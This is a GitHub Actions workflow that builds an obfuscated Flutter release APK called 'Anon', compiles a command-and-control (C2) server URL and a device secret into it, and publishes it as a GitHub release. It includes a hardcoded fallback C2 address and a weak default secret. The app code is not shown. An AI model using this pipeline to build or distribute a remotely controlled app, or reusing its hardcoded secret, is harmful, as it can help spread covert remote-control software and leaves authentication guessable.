# Build release APK on GitHub-hosted runners (Flutter + Android SDK)
name: Build APK

on:
  workflow_dispatch:
    inputs:
      c2_url:
        description: "C2 Worker URL (optional if secret C2_URL is set)"
        required: false
        type: string
      upload_symbols:
        description: "Upload Dart obfuscation symbols as artifact"
        required: false
        default: true
        type: boolean
  push:
    branches: [main, master]
    tags: ["v*"]
    paths:
      - "lib/**"
      - "android/**"
      - "pubspec.yaml"
      - "pubspec.lock"
      - ".github/workflows/build-apk.yml"
  pull_request:
    branches: [main, master]
    paths:
      - "lib/**"
      - "android/**"
      - "pubspec.yaml"

concurrency:
  group: build-apk-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: write

jobs:
  apk:
    name: Flutter release APK
    runs-on: ubuntu-latest
    timeout-minutes: 45

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Java 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Set up Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: stable
          cache: true

      - name: Flutter version
        run: flutter --version

      - name: Resolve C2 defines
        id: defines
        shell: bash
        run: |
          C2="${{ github.event.inputs.c2_url }}"
          if [ -z "$C2" ]; then C2="${{ secrets.C2_URL }}"; fi
          SECRET="${{ secrets.DEVICE_SECRET }}"
          if [ -z "$C2" ]; then
            echo "::warning::C2_URL not set — APK will use compile-time default"
            C2="https://anon-c2.bittermusic.workers.dev"
          fi
          if [ -z "$SECRET" ]; then
            echo "::warning::DEVICE_SECRET not set — APK will use compile-time default"
            SECRET="qwertyuiopasdfghjklzxcvbnm"
          fi
          echo "c2_url=$C2" >> "$GITHUB_OUTPUT"

      - name: Restore release keystore
        if: github.event_name != 'pull_request'
        working-directory: android
        env:
          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
          STORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
        run: |
          set -euo pipefail
          if [ -z "${KEYSTORE_BASE64:-}" ]; then
            echo "::warning::KEYSTORE_BASE64 secret not set — release APK will use debug signing"
            exit 0
          fi
          echo "$KEYSTORE_BASE64" | base64 -d > anon-release.jks
          test -s anon-release.jks
          {
            echo "storePassword=${STORE_PASSWORD}"
            echo "keyPassword=${KEY_PASSWORD}"
            echo "keyAlias=${KEY_ALIAS:-anon}"
            echo "storeFile=../anon-release.jks"
          } > key.properties
          echo "keystore restored ($(stat -c%s anon-release.jks) bytes)"

      - name: Pub get
        run: flutter pub get

      - name: Analyze (non-fatal)
        run: flutter analyze --no-fatal-infos || true

      - name: Build release APK (obfuscated)
        env:
          C2_URL: ${{ steps.defines.outputs.c2_url }}
          DEVICE_SECRET: ${{ secrets.DEVICE_SECRET }}
        run: |
          SECRET="${DEVICE_SECRET:-qwertyuiopasdfghjklzxcvbnm}"
          flutter build apk --release \
            --obfuscate \
            --split-debug-info=build/symbols \
            --dart-define=C2_URL="$C2_URL" \
            --dart-define=DEVICE_SECRET="$SECRET"

      - name: Package APK for upload
        id: apk
        run: |
          SRC="build/app/outputs/flutter-apk/app-release.apk"
          test -f "$SRC"
          mkdir -p dist
          cp "$SRC" dist/anon.apk
          sha256sum dist/anon.apk | tee dist/anon.apk.sha256
          echo "path=dist/anon.apk" >> "$GITHUB_OUTPUT"
          echo "size=$(stat -c%s dist/anon.apk)" >> "$GITHUB_OUTPUT"

      - name: Upload APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: anon-apk
          path: |
            dist/anon.apk
            dist/anon.apk.sha256
          if-no-files-found: error
          retention-days: 14

      - name: Upload obfuscation symbols
        if: ${{ github.event_name != 'pull_request' && github.event.inputs.upload_symbols != 'false' }}
        uses: actions/upload-artifact@v4
        with:
          name: anon-dart-symbols
          path: build/symbols/
          if-no-files-found: warn
          retention-days: 30

  release:
    name: Attach APK to GitHub Release
    needs: apk
    if: github.event_name != 'pull_request' && (github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master' || startsWith(github.ref, 'refs/tags/v'))
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Download APK artifact
        uses: actions/download-artifact@v4
        with:
          name: anon-apk
          path: dist

      - name: Resolve release tag
        id: tag
        shell: bash
        run: |
          if [[ "${GITHUB_REF}" == refs/tags/v* ]]; then
            TAG="${GITHUB_REF#refs/tags/}"
            NAME="Anon ${TAG}"
            PRERELEASE=false
          else
            SHORT="${GITHUB_SHA:0:7}"
            TAG="build-${{ github.run_number }}-${SHORT}"
            NAME="Anon APK build ${{ github.run_number }} (${SHORT})"
            PRERELEASE=true
          fi
          echo "tag=$TAG" >> "$GITHUB_OUTPUT"
          echo "name=$NAME" >> "$GITHUB_OUTPUT"
          echo "prerelease=$PRERELEASE" >> "$GITHUB_OUTPUT"
          ls -la dist/

      - name: Create GitHub Release and attach APK
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ steps.tag.outputs.tag }}
          name: ${{ steps.tag.outputs.name }}
          prerelease: ${{ steps.tag.outputs.prerelease }}
          generate_release_notes: true
          make_latest: true
          files: |
            dist/anon.apk
            dist/anon.apk.sha256
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
